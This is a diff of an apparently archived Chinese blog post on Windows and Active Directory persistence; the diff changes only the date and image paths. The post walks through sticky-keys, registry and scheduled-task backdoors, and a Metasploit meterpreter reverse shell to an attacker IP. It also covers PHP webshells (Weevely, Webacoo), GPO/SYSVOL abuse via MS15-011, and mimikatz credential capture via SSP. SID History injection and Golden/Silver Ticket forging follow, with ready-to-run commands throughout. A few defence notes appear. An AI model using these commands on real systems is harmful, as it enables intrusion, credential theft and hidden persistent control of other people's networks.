@@ -1,4 +1,4 @@
-<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.9.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><title>权限维持 - Guko's Blog</title><meta name="description" content="通过建立后门来维持对目标主机的控制权操作系统后门操作系统后门，泛指绕过目标系统安全控制体系的正规用户认证过程来维持对目标系统的控制权及隐匿控制行为的方法。粘滞键后门粘滞键后门是一种常见的持续控制方法在windows主机上连续按5此shift键，可调出粘滞键。Windows的粘滞键只要是为无法同时按多"><link type="text/css" rel="stylesheet" href="/css/pure.css?v=0.0.1"><link type="text/css" rel="stylesheet" href="/css/style.css?v=0.0.1"><script type="text/javascript" src="//cdn.bootcss.com/jquery/1.11.0/jquery.min.js"></script></head></html><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">权限维持</h1><a id="logo" href="/.">Guko's Blog</a></div><div id="nav-menu"><div class="bitcron_nav"><div class="site_nav_wrap"><div class="site_nav"><span class="a_container"><a href="/." class="selected active current">首页</a></span><span class="a_container"><a href="/archives/">归档</a></span><span class="a_container"><a href="/about/">关于</a></span><span class="a_container"><a href="/atom.xml">订阅</a></span></div></div></div></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">权限维持</h1><div class="post-meta">2020-10-26<script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" type="text/javascript"></script><span class="meta-space">  |  </span><span id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv"></span><span> 浏览</span></span></div><!--文章内容--><div class="post-content"><p>通过建立后门来维持对目标主机的控制权</p>
+<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.9.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><title>权限维持 - Guko's Blog</title><meta name="description" content="通过建立后门来维持对目标主机的控制权操作系统后门操作系统后门，泛指绕过目标系统安全控制体系的正规用户认证过程来维持对目标系统的控制权及隐匿控制行为的方法。粘滞键后门粘滞键后门是一种常见的持续控制方法在windows主机上连续按5此shift键，可调出粘滞键。Windows的粘滞键只要是为无法同时按多"><link type="text/css" rel="stylesheet" href="/css/pure.css?v=0.0.1"><link type="text/css" rel="stylesheet" href="/css/style.css?v=0.0.1"><script type="text/javascript" src="//cdn.bootcss.com/jquery/1.11.0/jquery.min.js"></script></head></html><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">权限维持</h1><a id="logo" href="/.">Guko's Blog</a></div><div id="nav-menu"><div class="bitcron_nav"><div class="site_nav_wrap"><div class="site_nav"><span class="a_container"><a href="/." class="selected active current">首页</a></span><span class="a_container"><a href="/archives/">归档</a></span><span class="a_container"><a href="/about/">关于</a></span><span class="a_container"><a href="/atom.xml">订阅</a></span></div></div></div></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">权限维持</h1><div class="post-meta">2020-07-13<script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" type="text/javascript"></script><span class="meta-space">  |  </span><span id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv"></span><span> 浏览</span></span></div><!--文章内容--><div class="post-content"><p>通过建立后门来维持对目标主机的控制权</p>
 <a id="more"></a>
 
 <h4 id="操作系统后门"><a href="#操作系统后门" class="headerlink" title="操作系统后门"></a>操作系统后门</h4><p>操作系统后门，泛指绕过目标系统安全控制体系的正规用户认证过程来维持对目标系统的控制权及隐匿控制行为的方法。</p>
@@ -7,24 +7,24 @@
 <p>用可执行文件<code>sethc.exe.bak</code>替换<code>windows\system32</code>目录下的粘滞键可执行文件<code>sethe.exe</code>连续按5次<code>shift</code>键，将弹出命令行窗口，可以直接<code>system</code>权限执行系统命令、创建管理员用户、登录服务器等</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy C:\WINDOWS\system32\cmd.exe C:\windows\system32\sethc.exe</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/10/26/权限维持/2.png" alt></p>
+<p><img src="/2020/07/13/权限维持/2.png" alt></p>
 <p>注销，在登录页面按<code>5次shift</code>键调用后门</p>
-<p><img src="/2020/10/26/权限维持/3.png" alt></p>
+<p><img src="/2020/07/13/权限维持/3.png" alt></p>
 <p>通过命令添加管理员登录</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user gkk test@123 /add &amp;&amp; net localgroup administrators gkk /add</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/10/26/权限维持/4.png" alt></p>
+<p><img src="/2020/07/13/权限维持/4.png" alt></p>
 <p>除了手动的还可以直接使用<code>Empire</code>来实现这一功能,之前有</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">usemodule lateral_movement/invoke_wmi_debugger</span><br><span class="line">set Listener</span><br><span class="line">set ComputerName WIN7-X64-TEST.hacke.testlab</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/10/26/权限维持/5.png" alt></p>
+<p><img src="/2020/07/13/权限维持/5.png" alt></p>
 <p>运行后，在目标主机登录窗口按5次<code>Shift</code>键即可触发后门</p>
 <h5 id="注册表注入后门"><a href="#注册表注入后门" class="headerlink" title="注册表注入后门"></a>注册表注入后门</h5><p>在普通用户权限下，将需要执行的后门程序或者脚本路径填写到注册表键<code>HKCU:Software\Microsoft\Windows\CurrentVersion\Run</code>中，键名可以随意设置</p>
 <p>依旧使用<code>Empire</code>实现</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">usemodule persistence/elevated/registry*</span><br><span class="line">set Listener </span><br><span class="line">execute</span><br></pre></td></tr></table></figure>
 
 <p>重启目标机,会弹个黑框，之后就会收到反弹的<code>shell</code></p>
-<p><img src="/2020/10/26/权限维持/6.png" alt></p>
+<p><img src="/2020/07/13/权限维持/6.png" alt></p>
 <h5 id="计划任务后门"><a href="#计划任务后门" class="headerlink" title="计划任务后门"></a>计划任务后门</h5><p>计划任务在windows7及之前版本的操作系统中使用<code>at命令</code>调用，在从windows8本本开始的操作系统中使用<code>schtasks命令</code>调用。计划任务后门分为管理员权限和普通用户两种。管理员权限的后门可以设置更多的计划任务，例如重启后运行</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /Create /tn Updater /tr notepad.exe /sc hourly /mo 1</span><br></pre></td></tr></table></figure>
 
@@ -34,7 +34,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery </span><br><span class="line">set target 2</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line">set lport 443</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
 
 <p>在目标系统中输入生成的后门代码，就会创建一个新的会话</p>
-<p><img src="/2020/10/26/权限维持/7.png" alt></p>
+<p><img src="/2020/07/13/权限维持/7.png" alt></p>
 <p>*<em>2、在powerSploit中模拟计划任务后门 *</em></p>
 <p>使用PowerShell版本的PowerSploit渗透测试框架的Persistence模块，可以模拟生成一个自动创建计划任务的后门脚本</p>
 <p>上传到目标后，导入脚本</p>
@@ -58,7 +58,7 @@
 <li>安装HTTP代理</li>
 </ul>
 <p>在kali中输入<code>weevely</code>查看帮助信息</p>
-<p><img src="/2020/10/26/权限维持/8.png" alt></p>
+<p><img src="/2020/07/13/权限维持/8.png" alt></p>
 <ul>
 <li>weekly<url><password>[cmd]：链接一句话木马</password></url></li>
 <li>Weekly session<path></path>[cmd]:加载会话文件</li>
@@ -67,7 +67,7 @@
 <p>如下生成一个<code>webshell</code>，命令为<code>test.php</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely generate test /home/kali/Desktop/test.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/10/26/权限维持/9.png" alt></p>
+<p><img src="/2020/07/13/权限维持/9.png" alt></p>
 <p>在把生成的后门文件上传的目标主机后，在当前机器输入如下命令连接<code>webshell</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely http://127.0.0.1/test.php test</span><br></pre></td></tr></table></figure>
 
@@ -78,11 +78,11 @@
 <h5 id="webacoo后门"><a href="#webacoo后门" class="headerlink" title="webacoo后门"></a>webacoo后门</h5><p><code>webacoo(Web Backdoor Cookie)</code>是一款针对PHP平台的We后门工具,最新版已去除，老版本的kali自带</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webacoo -h</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/10/26/权限维持/10.png" alt></p>
+<p><img src="/2020/07/13/权限维持/10.png" alt></p>
 <p>如下命令，生生一个webshell，并保存为test.<em>php</em></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webacoo -g -o /root/桌面/test.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/10/26/权限维持/11.png" alt></p>
+<p><img src="/2020/07/13/权限维持/11.png" alt></p>
 <p>将生成的后门文件上传到目标服务器后使用如下命令连接<code>webshell,</code>连接成功后，可以使用<code>load</code>命令查看模块，并可以进行上传、下载、连接数据库等操作，<code>exit</code>退出</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webacoo -t -u http://127.0.0.1/test.php</span><br></pre></td></tr></table></figure>
 
@@ -115,12 +115,12 @@
 <p>在域控制器中打开mimikatz,分别输入如下命令，显示<code>krbtgt</code>的<code>NTLM Hash</code>为<code>ff73ba115f7d6145f4c2e41f97f9a320</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">lsadump::lsa /patch /name:krbtgt</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/10/26/权限维持/12.png" alt></p>
+<p><img src="/2020/07/13/权限维持/12.png" alt></p>
 <p>（2）使用mimikatz查看并读取<code>SAM</code>文件中本地管理员的<code>NTLM Hash</code></p>
 <p>在域控制器中运行mimikatz，输入如下命令，显示<code>DSRM账号的NTLM Hash</code>为<code>09bc0266e773764dc3606744ddbe133d</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//token::elevate</span><br><span class="line">//lsadump::sam</span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/10/26/权限维持/13.png" alt></p>
+<p><img src="/2020/07/13/权限维持/13.png" alt></p>
 <p>（3）将<code>DSRM账号</code>和<code>krbtgt的NTLM Hash</code>同步</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SET DSRM PASSWORD</span><br><span class="line">SYNC FROM DOMAIN account krbtgt</span><br></pre></td></tr></table></figure>
 
@@ -157,32 +157,32 @@
 <p>（1）查看域控制器共享文件，执行如下命令</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">net view \\dc.hacke.testlab</span><br><span class="line">dir \\dc.hacke.testlab\SYSVOL</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/10/26/权限维持/45.png" alt></p>
+<p><img src="/2020/07/13/权限维持/45.png" alt></p>
 <p>（2）在域控制器的SYSVOL目录下添加zhangsan用户密码为test@123的控制权限</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user zhangsan test@123 /add &amp;&amp; net localgroup administrators zhangsan /add</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/10/26/权限维持/46.png" alt></p>
-<p><img src="/2020/10/26/权限维持/47.png" alt></p>
+<p><img src="/2020/07/13/权限维持/46.png" alt></p>
+<p><img src="/2020/07/13/权限维持/47.png" alt></p>
 <p>（3）向域控制器的<code>SYSVOL</code>目录内写入文件并进行文件目录和类型的查看，执行如下命令，可以看到普通用户拥有了对域控制器SYSVOL目录读写的权限。这之后我们就可以修改组策略，实现隐蔽后门</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;demo&quot; &gt;\\dc.hacke.testlab\SYSVOL\sanr.text</span><br><span class="line">dir \\dc.hacke.testlab\SYSVOl</span><br><span class="line">tyep \\dc.hacke.testlab\SYSVOL\sanr.txt</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/10/26/权限维持/48.png" alt></p>
+<p><img src="/2020/07/13/权限维持/48.png" alt></p>
 <p>（4）利用MS15-011漏洞进行权限维持</p>
 <p>window域成员机器每间隔90min+random()*30min就会向域控制器请求更新组策略，并以gpt.ini文件中的版本信息来判断是否正在使用最新的域策略。如果gpt.ini的版本信息较低，域成员机器会请求GptTmpl.inf文件的策略进行更新。</p>
 <p>为了利用该漏洞，我们需要修改<code>Version</code>的值，路径在<code>C:\Windows\SYSVOL\domain\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}</code>中的<code>GPT.INI</code></p>
-<p><img src="/2020/10/26/权限维持/49.png" alt></p>
+<p><img src="/2020/07/13/权限维持/49.png" alt></p>
 <p>我们利用默认域组策略GUID:{31B2F340-016D-11D2-945F-00C04FB984F9}进行权限维持。域策略中的文件GptTmpl.inf（目录为C:\Windows\SYSVOL\domain\Policies{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf）用于存储组策略的配置，如密码复杂度是否启用、密码最长期限、最短密码长度等。</p>
 <p>其中有一项是注册表，我们可以把注册表项已有的配置信息替换为指定的恶意配置信息，等域成员机器更新组策略时，组策略文件就会被下载到域成员的机器中执行并修改注册表的内容，执行指定的恶意程序</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[Registry Values]</span><br><span class="line">MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=4,1</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/10/26/权限维持/50.png" alt></p>
+<p><img src="/2020/07/13/权限维持/50.png" alt></p>
 <p>我们需要修改[Registry Values]项为：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmd.exe\Debugger=1,C:\Windows\System32\calc.exe</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/10/26/权限维持/51.png" alt></p>
+<p><img src="/2020/07/13/权限维持/51.png" alt></p>
 <p>这段代码用到了映像劫持<code>（Image File Execution Options）</code>技术。就是打开A程序的同时会执行B程序。当域成员更新完组策略后，会运行cmd.exe和calc.exe程序。我们可以根据需求对cmd.exe和calc.exe程序进行修改。</p>
 <p>最后更新组策略</p>
-<p><img src="/2020/10/26/权限维持/53.png" alt></p>
+<p><img src="/2020/07/13/权限维持/53.png" alt></p>
 <h5 id="SSP维持域控制权限"><a href="#SSP维持域控制权限" class="headerlink" title="SSP维持域控制权限"></a>SSP维持域控制权限</h5><p><code>SSP(Security Support Provider)</code>是Windows操作系统安全机制的提供者。简单说SSP是一个DLL文件，主要用来实现windows操作系统的身份认证功能，如NTLM、kerberos、Negotiate、Secure Channel(Schannel)、Digest、Credential(CredSSP)</p>
 <p>SSPI(Security Support Provider Interface安全支持提供程序接口)是windows操作系统在执行认证操作时使用的API接口。可以说SSPI是SSP的API接口</p>
 <p>如果获得了网络中目标机器的system权限，可以使用该方法进行持久化操作。其主要原理是LSA(Loacl Security Authority)用于身份验证；lsass.exe作为Windows系统进程，用于本地安全和登录策略；在系统启动时，SSP将被加载到lsass.exe进程中。但是，如果我们对LSA进行了扩展，自定义了恶意DLL文件，在系统启动时将其加载到lsass.exe进程中，就能够获取lsass.exe进程中的明文密码。这样，即使用户更改密码并重新登录，攻击者依然可以获取该账号的新密码。</p>
@@ -192,17 +192,17 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">misc::memssp</span><br></pre></td></tr></table></figure>
 
 <p>注销当前用户。注入用户名和密码后重新登录，获取明文密码，密码存储在日志文件<code>C:\Windows\System32\mimilsa.log</code>中</p>
-<p><img src="/2020/10/26/权限维持/15.png" alt></p>
+<p><img src="/2020/07/13/权限维持/15.png" alt></p>
 <p>第二个实验，将<code>mimikatz中的mimilib.dl</code>l放到系统的<code>C:\Windows\System32\</code>目录下，并将<code>mimiliv.dll</code>添加到注册表中。这种方法，及时系统重启，也不会影响持久化效果</p>
 <p>将mimikatz中的<code>mimilib.dll</code>复制到系统的<code>C:\Windows\System32\</code>目录下</p>
-<p><img src="/2020/10/26/权限维持/16.png" alt></p>
+<p><img src="/2020/07/13/权限维持/16.png" alt></p>
 <p>修改<code>HKEY_LOCAL_MACHINE\System\CurrentSet\Control\Lsa\Security Packages</code>项，加载新的<code>DLL</code>文件</p>
-<p><img src="/2020/10/26/权限维持/17.png" alt></p>
+<p><img src="/2020/07/13/权限维持/17.png" alt></p>
 <p>命令模式</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">copy mimilib.dll %systemroot%\system32</span><br><span class="line"></span><br><span class="line">reg query hklm\system\currentcontrolset\control\lsa\ /v &quot;Security Packages&quot; </span><br><span class="line"></span><br><span class="line">reg add &quot;hklm\system\currentcontrolset\control\lsa\&quot; /v &quot;Security Packages&quot; /d &quot;kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib&quot; /t REG_MULTI_SZ</span><br></pre></td></tr></table></figure>
 
 <p>系统重启后，如果DLL被成功加载，用户在登录时输入的账号和密码明文就会被记录在<code>C:\Windows\System32\kiwissp.log</code>中</p>
-<p><img src="/2020/10/26/权限维持/18.png" alt></p>
+<p><img src="/2020/07/13/权限维持/18.png" alt></p>
 <p><strong>2、SSP维持域控制器检测</strong></p>
 <ul>
 <li>检查HKEY_LOCAL_MACHINE\System\CurrentSet\Control\Lsa\Security Package项中是否含有可疑的DLL文件</li>
@@ -215,17 +215,17 @@
 <p>将<code>Aadministrator</code>的<code>SID</code>添加到恶意用户<code>hacke</code>的<code>SID History</code>属性中。使用powershell查看<code>hacke</code>用户的<code>SID History</code>属性。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module ActiveDirectory</span><br><span class="line">Get-ADUser hacke -Properties sidhistory</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/10/26/权限维持/19.png" alt></p>
+<p><img src="/2020/07/13/权限维持/19.png" alt></p>
 <p>打开一个具有域管理严的命令行窗口，运行mimikatz，将Administrator的SID添加到hacke用户的SID History属性中。注意：在使用mimikatz注入SID之前，需要使用<code>sid::patch</code>命令修复<code>NTDS</code>服务，否则无法将高权限的ISD注入低权限用户的SID History属性;mimikatz在2.1版本后，将misc::addsid模块移到了sid::add模式下</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sid::patch</span><br><span class="line">sid::add /sam:hacke /new:administrator</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/10/26/权限维持/20.png" alt></p>
+<p><img src="/2020/07/13/权限维持/20.png" alt></p>
 <p>再次使用powershell查看<code>hacke</code>用户的<code>SID History</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ADUser hacke -Properties sidhistory</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/10/26/权限维持/21.png" alt></p>
+<p><img src="/2020/07/13/权限维持/21.png" alt></p>
 <p>使用<code>hacke</code>用户登录系用，测试其是否具有<code>Administrator</code>的权限。尝试列出域控制器<code>C盘</code>的目录</p>
-<p><img src="/2020/10/26/权限维持/22.png" alt></p>
+<p><img src="/2020/07/13/权限维持/22.png" alt></p>
 <p><strong>2、SID History域后门防御</strong></p>
 <p>先列一下SID History域后门的特点</p>
 <ul>
@@ -266,32 +266,32 @@
 <p>通过<code>mimikatz的dcsync</code>功能远程转储活动目录中<code>ntds.dit</code>。指定<code>/user</code> 参数 只导出<code>krbtgt</code>账号的信息：<code>ff73ba115f7d6145f4c2e41f97f9a320</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:hacke.testlab /user:krbtgt</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/10/26/权限维持/23.png" alt></p>
+<p><img src="/2020/07/13/权限维持/23.png" alt></p>
 <p><strong>2、获取基本信息</strong></p>
 <p>（1）获取域SID</p>
 <p>查询SID,这种方法，可以以普通用户权限获取域内所有用户的SID。<code>hacke.testlab</code>域的<code>SID</code>为<code>S-1-5-21-3125703835-992822856-3564750058</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/10/26/权限维持/24.png" alt></p>
+<p><img src="/2020/07/13/权限维持/24.png" alt></p>
 <p>（2）获取当前用户的<code>SID</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /user</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/10/26/权限维持/25.png" alt></p>
+<p><img src="/2020/07/13/权限维持/25.png" alt></p>
 <p>（3）查询域管理员账号</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain admins&quot; /domain</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/10/26/权限维持/26.png" alt></p>
+<p><img src="/2020/07/13/权限维持/26.png" alt></p>
 <p>（3）查询域名</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/10/26/权限维持/27.png" alt></p>
+<p><img src="/2020/07/13/权限维持/27.png" alt></p>
 <p><strong>3、实验操作</strong></p>
 <p>在获取目标主机权限后，查看当前用户及其所属的组</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user testuser /domain</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/10/26/权限维持/28.png" alt></p>
+<p><img src="/2020/07/13/权限维持/28.png" alt></p>
 <p>输入<code>dir \\dc\c$</code>在注入票据前将返回提示信息<code>Access is denied</code>(表示权限不足)</p>
-<p><img src="/2020/10/26/权限维持/35.png" alt></p>
+<p><img src="/2020/07/13/权限维持/35.png" alt></p>
 <p>（1）清空票据</p>
 <p>运行mimikatz，清除当前会话中的票据</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br></pre></td></tr></table></figure>
@@ -300,27 +300,27 @@
 <p>使用mimikatz生成包含<code>krbtgt</code>身份的票据,命令执行后会提示保存成功，这时会在本地生成一个名为<code>Administrator:kiribi</code>的文件</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /admin:administrator /domain:hacke.testlab /sid:S-1-5-21-3125703835-992822856-3564750058 /krbtgt:ff73ba115f7d6145f4c2e41f97f9a320 /ticket:Administrator.kiribi</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/10/26/权限维持/29.png" alt></p>
+<p><img src="/2020/07/13/权限维持/29.png" alt></p>
 <p>（3）传递票据并注入内存</p>
 <p>将<code>Aadministrator:kiribi</code>票据注入内存</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt Administrator.kiribi</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/10/26/权限维持/30.png" alt></p>
+<p><img src="/2020/07/13/权限维持/30.png" alt></p>
 <p>（4）检查当前会话中的票据</p>
 <p>刚刚注入的票据就会出现在当前的会话中</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::tgt</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/10/26/权限维持/31.png" alt></p>
+<p><img src="/2020/07/13/权限维持/31.png" alt></p>
 <p><strong>4、权限验证</strong></p>
 <p>输入<code>dir \\dc\c$</code>。很明显，在将票据注入内存之前，系统提示权限不足，将票据注入内存之后，列出了域控制器C盘的目录，表示身份伪造成功</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir \\dc\c$</span><br><span class="line">cscript wmiexec.vbs /shell dc</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/10/26/权限维持/32.png" alt></p>
-<p><img src="/2020/10/26/权限维持/33.png" alt></p>
+<p><img src="/2020/07/13/权限维持/32.png" alt></p>
+<p><img src="/2020/07/13/权限维持/33.png" alt></p>
 <p>使用<code>krbtgt的AES-256</code>值生成票据并将其注入内存，也可伪造用户。之前导出的<code>krbtgt的AES-256</code>值为<code>40e24d35600583634503c3aa076b39ecc3031a97467103539221472b3897e0c2</code>如下命令，生成一张票据</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /admin:administrator /domain:hacke.testlab /sid:S-1-5-21-3125703835-992822856-3564750058 /aes256:40e24d35600583634503c3aa076b39ecc3031a97467103539221472b3897e0c2 /ticket:Administrator.kiribi</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/10/26/权限维持/34.png" alt></p>
+<p><img src="/2020/07/13/权限维持/34.png" alt></p>
 <p>其他操作同上</p>
 <p><strong>5、Golden Ticket攻击的防御</strong></p>
 <p>管理员通常会修改域管理员的密码，但有时会忘记将krbtgt密码一并重置。因此，如果要防御Golden Ticket，需要将krbtgt密码重置两次</p>
@@ -347,26 +347,26 @@
 <p>首先使用当前域用户权限，查询对域控制器的共享目录的访问权限</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\dc\c$</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/10/26/权限维持/35.png" alt></p>
+<p><img src="/2020/07/13/权限维持/35.png" alt></p>
 <p>在域控制器上运行mimikatz，获取服务账号的NTLM Hash <code>09bc0266e773764dc3606744ddbe133d</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//使用log参数以便复制散列值</span><br><span class="line">mimikatz.exe log &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/10/26/权限维持/36.png" alt></p>
+<p><img src="/2020/07/13/权限维持/36.png" alt></p>
 <p>清空本地票据缓存</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge #清理本地票据缓存</span><br><span class="line">kerberos::list #查看本地保存的票据</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/10/26/权限维持/38.png" alt></p>
+<p><img src="/2020/07/13/权限维持/38.png" alt></p>
 <p>在域成员机器上，既不能访问域控制器共享目录的机器中输入命令生成伪造的<code>Silver Ticket</code></p>
